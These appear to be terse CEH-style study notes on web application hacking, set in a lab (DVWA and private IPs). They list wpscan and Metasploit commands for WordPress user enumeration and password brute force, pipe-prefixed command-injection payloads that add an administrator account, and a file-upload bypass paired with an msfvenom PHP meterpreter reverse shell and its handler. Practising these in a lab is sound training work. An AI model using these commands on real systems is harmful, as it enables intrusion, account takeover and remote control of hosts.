1) Parameter Tampering = changing the last parameter = IDOR 
2) XSS = cross site scripting 
3) Enumeration and Hacking a web Application Using WPscan and metasploit  we can also use nmap to enumerate the users in wordpress 
	1) Commands for WPSCAN
		1) wpscan --url https://example/ --enumerate u (To enumerate the user) 
		2) wpscan --url http://172.16.0.27:8080/CEH/ -usernames elliot  -P /path/pass.txt
		3) wpscan --url https://example/ --enumerate vp (To enumerate vuln plugins)

	2) Commands for  metasploit 
		1) use auxiliary/scanner/http/wordpress_login_enum
		2) options
		3) run
4) Exploiting remote command execution login -> set the DVWA security to low  -> issue the commands
	1) for command injection
		1) | hostname
		2) | whoami
		3) | net user
		4) | dir C:\
		5) | net user Test /Add
		6) | net localgroup Administrators Test /Add

5) Vega 
	1) Add IP see the vuln

6) Acunetix 
	1) vuln scanner

7) Upload Vuln 
	1) all were easy 
	2) in one at GIF98 to the end of file to upload it and rename it as upload.php.jpg
	3) https://techsphinx.com/hacking/hacking-for-beginners-file-upload-vulnerability/
	4) msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f raw
	5) use exploit/multi/handler
	6) show options set lhost as 10.10.10.10. set lport 1234 -> done 

8) Command injection will see in paper 
9) CSRF 
	1) we will se in paper 

